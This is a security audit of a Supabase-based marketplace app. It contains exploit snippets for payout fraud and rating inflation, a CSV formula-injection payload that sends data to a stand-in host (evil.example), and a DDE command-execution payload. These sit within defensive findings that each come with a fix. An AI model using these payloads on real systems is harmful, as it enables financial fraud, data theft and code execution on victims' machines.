# MangaiMart — Full Security Audit

**Date:** 2026-08-11
**Branch:** `fix/seller-console-audit-2026-08`
**Scope:** whole application — 20 serverless endpoints, `middleware.js` (edge), 71 migrations,
3 Supabase Edge Functions, 248 source files across the buyer, seller and admin consoles.

## Method, and what that means for these findings

This is a **static review of the code and the database policy set**, not a live penetration test.
I read every file in `api/`, every RLS policy and guard trigger in `supabase/`, the auth context,
the storage layer, and the payment paths end to end. I did **not** run exploits against the live
Supabase project or production deployment.

So: the exploit paths below are traced through real code and real policies and I am confident in
them, but each one is marked with what would confirm it on your database. Two things follow from
that, and both matter:

- **Migration `0072` is written but NOT applied.** Nothing in this report is fixed in your database
  until you run it. The code fixes (CSV, RNG) *are* applied and build clean.
- Where a finding depends on a policy that exists only in the live DB rather than in the repo, I say
  so rather than guessing.

One structural note. The core tables — `profiles`, `boutiques`, `products`, `orders`, `order_items`,
`conversations`, `messages` — are created by `supabase/schema.sql`, which is **not** a numbered
migration and appears never to have been revised. Every policy on those tables is still as originally
written; the numbered migrations only ever added *triggers* in front of them. That is the shape
behind the highest-severity finding here, and it is worth fixing as a pattern, not just as a bug.

---

## Overall Security Score: **72 / 100**

Applying `0072` and adding a CSP takes this to roughly **86 / 100**.

The score is dragged down by one high-severity money bug and a cluster of mediums. It is held **up**
by a payment layer that is genuinely better than most production marketplaces I have read — see
"What is already right" below, because it is a large part of the picture and it would be misleading
to lead with only the failures.

| Severity | Count | Status |
|---|---|---|
| Critical | 0 | — |
| **High** | **2** | Fix written (`0072`), **needs applying** |
| Medium | 6 | 2 fixed in code, 1 fixed in `0072`, 3 need your decision |
| Low | 5 | Reported, no code change made |
| Not implemented (scope gaps) | 5 | See §4 |

---

## 1. High-severity findings

### H-1 — A seller can un-settle their own paid-out orders and be paid twice

**Files:** `supabase/schema.sql:132`, `src/data/payouts.ts:64`, `supabase/migrations/0025_seller_payouts.sql:107`
**OWASP:** A01 Broken Access Control · A04 Insecure Design · CWE-639, CWE-284

`schema.sql` grants a seller UPDATE on their own orders with **no `WITH CHECK` and no column list**:

```sql
create policy "orders: seller or admin update" on orders for update
  using (exists (select 1 from boutiques b
                 where b.id = boutique_id and b.owner_id = auth.uid())
         or is_admin());
```

In Postgres, an UPDATE policy with no `WITH CHECK` reuses `USING` for the new row — which authorises
writing **every column**. Three later migrations narrowed that, each closing the hole in front of it
at the time:

| Migration | Columns it protects |
|---|---|
| `0022` | `payment_status` (prepaid), `total`, `cod_fee`, `shipping_fee` |
| `0026` | `delivered_at` (no back-dating) |
| `0063` | `delivery_disputed` (a seller cannot clear a dispute against itself) |

That is a **denylist**, and it missed the two columns the payout run actually keys on. Both
`src/data/payouts.ts` (what the admin console shows as owed) and `open_auto_payout` in `0025`
select outstanding money with exactly this filter:

```
.is('payout_id', null).eq('payment_status', 'paid').eq('refunded', false)
```

`payout_id` is the stamp meaning "already settled". `refunded` means "this money was reversed".
Neither is guarded, and the seller console talks to PostgREST **directly with the anon key**
(`src/data/orders.ts:87` and friends are plain `.update()` calls), so the seller's own browser
session is sufficient.

**Exploitation steps.** Signed in as any approved seller, from the browser console:

```js
// 1. Read your own already-settled orders — allowed, they are yours.
const { data } = await supabase.from('orders')
  .select('id, order_number, total, payout_id')
  .eq('boutique_id', MY_BOUTIQUE_ID).not('payout_id', 'is', null);

// 2. Un-stamp them. No trigger objects.
await supabase.from('orders')
  .update({ payout_id: null, refunded: false })
  .eq('boutique_id', MY_BOUTIQUE_ID);
```

Every order the seller has already been paid for reappears in `/admin/payments` as an outstanding
balance, and the admin settles it a second time. There is no alert and no audit entry — the admin
console has no way to tell a re-opened order from a new one.

**Impact:** direct, repeatable financial loss, bounded only by the seller's own historical volume.
Because payouts are currently manual (`AUTO_PAYOUTS_ENABLED = false`), the loss lands the moment an
admin trusts the console's outstanding figure — which is the console's entire purpose.

**Fix:** `supabase/migrations/0072_order_settlement_lockdown.sql` (written, **not applied**).
**To confirm on your DB:** as a seller, `update orders set payout_id = null where id = '<own order>';`
— before `0072` this succeeds; after, it raises `orders: payout_id is settlement state and is admin-managed`.

---

### H-2 — The same policy lets a seller invent money the platform owes them

**Files:** `supabase/schema.sql:132`, `src/data/payouts.ts:98`, `src/data/payouts.ts:74`
**OWASP:** A01 · A04 · CWE-639

Same root cause as H-1, two more unguarded columns, and worth listing separately because the exploit
is *additive* rather than a replay — it fabricates a balance that never existed.

**`platform_discount`** — on a COD order the seller collected cash *minus* any platform-funded
coupon, so `fetchPayoutSummaries` adds `platform_discount` back to what the platform owes them
(`src/data/payouts.ts:98`, mirroring `0053`). It is not guarded:

```js
await supabase.from('orders')
  .update({ platform_discount: 5000 })       // a coupon that never existed
  .eq('id', MY_COD_ORDER_ID);
```

`codOwed` drops by ₹5,000 per order, i.e. the platform now believes it owes the seller that much.

**`channel`** — `fetchPayoutSummaries` skips walk-in POS sales with
`if ((r.channel ?? 'online') === 'offline') continue;` (`src/data/payouts.ts:74`), because that is
the seller's own till. Flipping `channel` from `'offline'` to `'online'` pulls the seller's own cash
receipts into the platform payout.

Also unguarded and covered by the same fix: `discount`, `coupon_code`, `payment_method`, `payment_id`,
and the identity columns `buyer_id` / `boutique_id` / `order_number` (re-pointing an order at another
boutique moves both the money and the buyer's order history).

**Fix:** same migration, `0072`.

---

## 2. Medium-severity findings

### M-1 — No Content-Security-Policy anywhere

**Files:** `vercel.json:20-30`, `index.html`
**OWASP:** A05 Security Misconfiguration

`vercel.json` sets a genuinely good header block — HSTS with preload, `nosniff`, `X-Frame-Options`,
`Referrer-Policy`, `Permissions-Policy`, COOP. **CSP is the one that is missing**, and there is no
`<meta http-equiv>` fallback in `index.html` either.

Mitigating: I found **zero** `dangerouslySetInnerHTML`, `innerHTML`, `eval` or `new Function` in
`src/`, and `middleware.js` escapes every interpolation including the JSON-LD (`middleware.js:75`,
`:1578`). So there is no *known* injection point today. CSP is the control that stops the next one —
and with Razorpay's checkout script, a third-party payment iframe and user-supplied image URLs in the
page, the blast radius of a future mistake is real.

**Recommended header** — add to the `"/(.*)"` block in `vercel.json`. Note this app is
overwhelmingly inline-styled, so `style-src` must allow `'unsafe-inline'`; scripts do not need it:

```json
{
  "key": "Content-Security-Policy",
  "value": "default-src 'self'; script-src 'self' https://checkout.razorpay.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://*.supabase.co https://lh3.googleusercontent.com; font-src 'self' data:; connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.razorpay.com https://lumberjack.razorpay.com; frame-src https://api.razorpay.com https://checkout.razorpay.com; frame-ancestors 'self'; base-uri 'self'; form-action 'self'; object-src 'none'"
}
```

**I have not applied this**, deliberately: a wrong CSP breaks checkout silently and I cannot smoke-test
it from here. Deploy it to a preview URL first and walk one prepaid order end to end with the browser
console open — CSP violations report there before they break anything visible. Consider shipping it
as `Content-Security-Policy-Report-Only` for a day first.

---

### M-2 — Unrestricted file upload to public buckets, reachable without an account

**Files:** `supabase/migrations/0017_relax_product_image_insert.sql:38`, `src/lib/uploadImage.ts:67`
**OWASP:** A04 · A05 · CWE-434

Three things compound:

1. **INSERT is open to any `authenticated` user** on `product-images` (and `boutique-images`).
   `0034` correctly locked UPDATE and DELETE to the owning boutique, but deliberately left INSERT
   broad.
2. **`authenticated` includes anonymous users.** Opening a chat calls `signInAnonymously()`
   (`src/data/chat.ts:26`), so *any visitor* gets a session that satisfies the policy without ever
   creating an account. This is what turns a seller-only concern into a public one.
3. **No bucket declares `allowed_mime_types` or `file_size_limit`** — I checked all seven bucket
   definitions. The only validation is in the browser:

```ts
// src/lib/uploadImage.ts:67 — both trivially bypassed by calling storage.upload() directly
if (!file.type.startsWith('image/')) throw new Error('Please choose an image file (JPG or PNG)');
if (file.size > 10 * 1024 * 1024) throw new Error('Image is too large…');
```

The upload also passes `contentType: file.type` (`:97`), so **the uploader chooses the Content-Type
the bucket serves back**. That is arbitrary file hosting on your storage domain — phishing pages and
malware under your project's URL, plus uncapped storage billing.

Not stored XSS against the app: the bucket is a different origin from the app, so it cannot reach
the Supabase session in the app's `localStorage`.

**Fix:** `0072` sets `allowed_mime_types` and `file_size_limit` on all five user-facing buckets, and
narrows INSERT to non-anonymous users. **Needs applying.**

---

### M-3 — Admin temporary passwords generated with `Math.random()` — **FIXED**

**File:** `api/admin-create-user.js:18` · **OWASP:** A02 · CWE-338

`generateTempPassword()` built the one-time password for every newly created account — **including
admin accounts** — from `Math.random()`. V8 implements that as xorshift128+, seeded once per isolate
and never reseeded, so observing a few outputs is enough to recover the generator state and predict
subsequent values. A warm serverless instance serves many requests from one isolate.

**Fixed** — now uses `crypto.randomInt()`, which is a CSPRNG and also avoids the modulo bias that
`bytes[i] % 52` would introduce, keeping the full ~68 bits of entropy.

---

### M-4 — CSV formula injection in all four exports — **FIXED**

**Files:** `src/data/adminUsers.ts:170`, `src/data/expenses.ts:276`, `src/pages/admin/Reports.tsx:32`, `src/pages/seller/Orders.tsx:63`
**OWASP:** A03 Injection · CWE-1236

All four exporters quoted their fields, which handles commas — but **quoting does not stop formula
evaluation**, because the CSV parser strips the quotes before the spreadsheet sees the text. Excel,
LibreOffice and Sheets all evaluate a cell starting `=`, `+`, `-` or `@`.

Every value in these exports is attacker-supplied: a buyer types their own `full_name`, `phone` and
`city`; a seller names their own boutique and products. So a buyer setting their name to

```
=HYPERLINK("https://evil.example/?x="&A1,"Payroll")
```

ships an exfiltration link into `mangaimart-users.csv`, and the `=cmd|'/c calc'!A0` DDE variant
executes on the machine of whoever opens it — by definition an admin.

**Fixed** — new `src/lib/csv.ts` (`csvCell` / `csvDocument`) prefixes a literal apostrophe to any
value with a formula lead character (including tab and CR, which are skipped as leading whitespace),
and all four call sites now use it. Build and lint pass.

---

### M-5 — `/api/health` is unauthenticated and verbose

**File:** `api/health.js:243` · **OWASP:** A01 · A05 · CWE-200

`GET /api/health` needs no credential and returns, to anyone:

- the Supabase project host the functions use, and whether it differs from the browser's (`:125`, `:128`)
- the service-role **key format** — `sb_secret` vs `legacy JWT` (`:132`)
- **row counts** for `products`, `boutiques` and `orders` (`:61`) — your live order volume is
  commercially sensitive
- whether each table and the `reserve_stock` RPC exists, with PostgREST's own error text and codes
- Razorpay: how many merchant accounts are configured, their labels, **whether each is `live` or
  `test`**, which one the admin switch currently points at, and the gateway's error text (`:230`)

None of it is a secret in itself; together it is a precise map of your backend for anyone
preparing an attack, and the order count is a business leak on its own.

The endpoint is genuinely valuable — `CLAUDE.md` rule 6 makes it your first diagnostic when orders
break, and that is the right call. **I have not changed it**, because gating it wrongly would cost
you the debugging workflow it exists for. The fix that keeps both:

```js
// api/health.js — keep the liveness bit public, gate the detail.
const detailToken = process.env.HEALTH_TOKEN;
const authorized = !detailToken ||
  req.headers['x-health-token'] === detailToken;   // constant-time compare in practice

if (!authorized) {
  res.setHeader('Cache-Control', 'no-store');
  return res.status(checkoutReady ? 200 : 503).json({ checkoutReady, checkedAt: … });
}
// …full body unchanged when the token matches (or when HEALTH_TOKEN is unset).
```

Leaving `HEALTH_TOKEN` unset preserves today's behaviour exactly, so this can ship dark and be
switched on when you set the variable.

---

### M-6 — A seller can set their own star rating and review count

**Files:** `supabase/schema.sql:93`, `src/lib/ranking.ts:176` · **OWASP:** A04 Insecure Design · CWE-639

Third instance of the H-1 pattern, on the `products` and `boutiques` update policies. `0023` and
`0031` guarded the counters *they* added (`sold_count`, `views_count`, `shares_count`,
`wishlist_count`), but `rating` and `reviews_count` pre-date both — they come from `schema.sql` — and
were never guarded. The owning seller can write them directly.

Those columns are **40% of the discovery ranking score** (`src/lib/ranking.ts:176`):

```
score = 0.55·sales + 0.25·rating + 0.15·reviews + 0.05·freshness
```

The 0.55 sales term is safe. The other two are not:

```js
await supabase.from('products')
  .update({ rating: 5, reviews_count: 9999 })
  .eq('boutique_id', MY_BOUTIQUE_ID);
```

That lifts the seller's whole catalogue to the top of every "See all" page, collection and search
result, and paints a fabricated "5.0 ★ (9999)" on each product page as social proof to buyers.
`boutiques.rating`, `reviews_count` and `positive_rating` are writable the same way and feed the
boutique ranking.

Worth noting this is **not** a hypothetical given your context: the SEO audit from earlier today
already flags test reviews as a deploy blocker, and ranking integrity is what the discovery pages
sell to sellers.

**Fix:** `0072` part 2. The one legitimate writer is `recompute_review_aggregates` (`0014`), which is
`SECURITY DEFINER` but still runs as the calling buyer — so a naive guard would revert its writes
too. The migration uses the transaction-local flag pattern `0023` and `0031` already established:
the aggregate raises `agilam.review_aggregate`, and the new guards stand down while it is set.
**Needs applying.**

---

## 3. Low-severity findings

**L-1 — PostgREST filter injection in two search paths.**
`src/data/adminProducts.ts:44` and `src/data/orders.ts:179` interpolate raw user text into an `.or()`
filter expression: ``query.or(`title.ilike.${s},category.ilike.${s}`)``. A search containing `,` or
`)` changes the filter's structure. **Not a data-exfiltration path** — RLS still applies to the
result, so a seller cannot reach another seller's orders this way — but it corrupts queries and is
the wrong pattern to keep. Escape commas/parens, or use `.ilike()` chained with `.or()` on
pre-sanitised terms. Same pattern in `api/admin-list-users.js:68` (admin-gated, so lower still).

**L-2 — `platform_settings` is world-readable including `razorpay_account`.**
`0048` created `"settings: public read" … using (true)`, which was correct for commission and fee
figures (they are published in the policy pages anyway). `0064` then added `razorpay_account` to the
same row, so any visitor can read which merchant account is currently live. Minor operational
disclosure; fix by moving it to a column-level grant or a settings view.

**L-3 — Rate limiting degrades silently to per-instance.**
`api/_rateLimit.js` is well built — Upstash-backed global limits with an in-memory fallback — but the
fallback is **per serverless instance**, so the effective limit multiplies by the number of warm
instances. It also fails **open** on any Redis error (`:79`), which is the right call for checkout
availability but means a Redis outage removes the brake entirely. Your own memory notes Upstash still
needs configuring; until it is, treat every documented limit as advisory.

**L-4 — Admin endpoints have no rate limit.**
`admin-create-user`, `admin-delete-user` and `admin-list-users` call no `enforceRateLimit`. All three
require a valid admin bearer token that is re-verified against `profiles` (role/status/deleted_at)
with the service role, so this is not an auth bypass — but it leaves no brake on a compromised or
malicious admin session enumerating the whole user table.

**L-5 — The COD abuse brake is keyed on a value the attacker supplies.**
`api/place-order.js:367` limits open COD orders per `guest_phone` — taken from the request body.
Changing one digit resets the counter. By that point in the handler the request is **authenticated**
and `buyerId` is known (`:253`), so the check should key on `buyer_id` (or both). Impact is seller
stock lockup rather than direct loss.

---

## 4. Requested scope that does not exist in this application

Reporting these as gaps rather than passes, since you asked me to verify them:

- **Super Admin / Delivery Partner / Support Staff roles — not implemented.** `profiles.role` is
  `check (role in ('buyer','seller','admin'))`. There are three roles, no privilege tiers within
  admin, and no delivery or support persona. Every admin is a full admin.
- **OTP verification — not implemented.** `src/pages/auth/Otp.tsx` is a 74-line stub with no
  `supabase.auth` call. There is no OTP factor on any login path.
- **Multi-factor authentication — not implemented** anywhere, including the admin console. Given an
  admin can read every buyer's PII, address and order history, this is the single largest *missing*
  control in the application, even though it is an absence rather than a defect. Supabase supports
  TOTP enrolment; enabling it for the `admin` role is the highest-value hardening available.
- **WhatsApp / SMS messaging — not built.** Only `wa.me` deep links and a `whatsapp` contact column
  on `boutiques`. There is no outbound messaging integration, so there is no OTP abuse, spam or
  webhook surface to test.
- **Email verification and password policy** are Supabase dashboard settings, not code. I cannot read
  them from here. Confirm in the dashboard: minimum length ≥ 12, leaked-password protection on,
  email confirmations required.

---

## 5. What is already right

This matters for prioritisation — it is why the score is 72 and not 40, and these are the areas you
do **not** need to spend time on:

**The payment path is excellent.** `api/place-order.js` does what most implementations do not:
server-side pricing from DB prices only (`:261`), signature verification against every configured
merchant account with constant-time comparison (`_razorpay.js:156`), an independent
`payments.fetch()` to bind the payment to the claimed order id (`:415`), a **paise-exact** amount
assertion with automatic refund on mismatch (`:434`), a replay guard on `payment_id` (`:196`),
atomic stock reservation with release-and-refund on every failure branch, and coupon redemption
claimed atomically before the order rows are written (`:517`). Webhooks verify HMAC over the **raw**
body with `bodyParser: false`. I could not find a way to underpay, replay, or place a free prepaid
order.

**Multi-tenant read isolation holds.** Every table created by a numbered migration has RLS enabled —
I checked all 21. Cross-tenant reads are enforced by policy, not client checks, and the service-role
endpoints re-verify the caller's admin role against `profiles` rather than trusting a JWT claim.

**The known-bad patterns are absent.** No `dangerouslySetInnerHTML`, `innerHTML`, `eval` or
`new Function` in 248 source files. No secrets in the client bundle — the only `import.meta.env` reads
are `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY` and `VITE_RAZORPAY_KEY_ID`, all publishable by
design. `.env` is gitignored and untracked. All SQL goes through PostgREST or parameterised RPCs;
`security definer` functions consistently `set search_path = public`.

**Earlier fixes held up under review.** `0010` (role escalation), `0021` (boutique self-approval),
`0034` (storage cross-tenant tampering), `0058`/`0059` (coupon column lockdown) and `0069` (direct
order insertion) all do what they claim. H-1 exists because the *pattern* those fixes used — a
trigger denylist in front of an over-broad policy — eventually missed a column, not because any
individual fix was wrong.

---

## 6. Priority action plan

| # | Action | Severity | Owner | Effort |
|---|---|---|---|---|
| 1 | **Apply `0072_order_settlement_lockdown.sql`** — fixes H-1, H-2, M-2, M-6 | High | You | 2 min |
| 2 | Reconcile paid payouts against `orders.payout_id` for evidence H-1 was used | High | You | 30 min |
| 2b | Spot-check `products.rating` against `count(reviews)` for evidence of M-6 | Medium | You | 10 min |
| 3 | Add the CSP header to `vercel.json`, preview-test a prepaid order first | Medium | Dev | 1 hr |
| 4 | Deploy the CSV + RNG fixes (already in the working tree) | Medium | Dev | ship |
| 5 | Enable TOTP MFA for admin accounts in Supabase | *Missing control* | You | 1 hr |
| 6 | Gate `/api/health` detail behind `HEALTH_TOKEN` | Medium | Dev | 30 min |
| 7 | Configure Upstash so rate limits are actually global | Low | You | 15 min |
| 8 | Key the COD brake on `buyer_id`; fix the two `.or()` interpolations | Low | Dev | 1 hr |

**Action 2 is the one not to skip.** H-1 leaves no audit trail, so the only way to know whether it has
already been used is to compare what the `payouts` table says you have paid each boutique against the
orders currently showing as outstanding. An order that is `delivered`, `paid`, not `refunded`, and has
a null `payout_id` **but** is older than that boutique's most recent payout is the signature of a
re-opened order.

---

## 7. The pattern worth fixing, not just the bug

H-1 and H-2 are one root cause: **an over-broad RLS policy in `schema.sql` that was never revised,
with a growing denylist of triggers bolted in front of it.** Each trigger was a correct response to
the hole in front of it. The approach is what failed — a denylist has to enumerate every dangerous
column *and stay correct as columns are added*, and `orders` has gained 29 columns since `schema.sql`
was written.

`0072` fixes the columns. The durable fix is to **replace the policy with a column-scoped grant**,
the way `0021` already did for `boutiques` and `0058` did for `coupons`:

```sql
-- The shape to move toward: RLS says which ROWS, grants say which COLUMNS.
revoke update on orders from authenticated;
grant update (status, packed_at, payment_status, paid_at) on orders to authenticated;
```

That inverts the default — a column added tomorrow is closed until someone opens it, instead of open
until someone remembers to close it. It needs care with the existing stamp triggers (`0026`, `0042`,
`0051` write `delivered_at`, `accepted_at`, `shipped_at` and friends; those run as `security definer`
and are unaffected by the grant, but this wants testing against a staging copy before production).
I have not written it into `0072` for exactly that reason — `0072` is the safe, verifiable fix, and
this is the follow-up worth scheduling.

This audit found the same pattern three times — `orders` (H-1, H-2), and `products`/`boutiques`
(M-6). That is the argument for changing the approach rather than adding a fourth trigger. The one
remaining instance I did **not** find a concrete exploit for is `profiles`, which is guarded by
`0010`'s trigger in the same denylist shape and is worth the same column-grant treatment.

One column I deliberately left alone: `products.featured`. It is writable by the owning seller, but
the "Featured" tier was removed from the business model by decision, so I could not find a surface
where writing it changes what a buyer sees. Worth confirming before it gets wired to anything again.
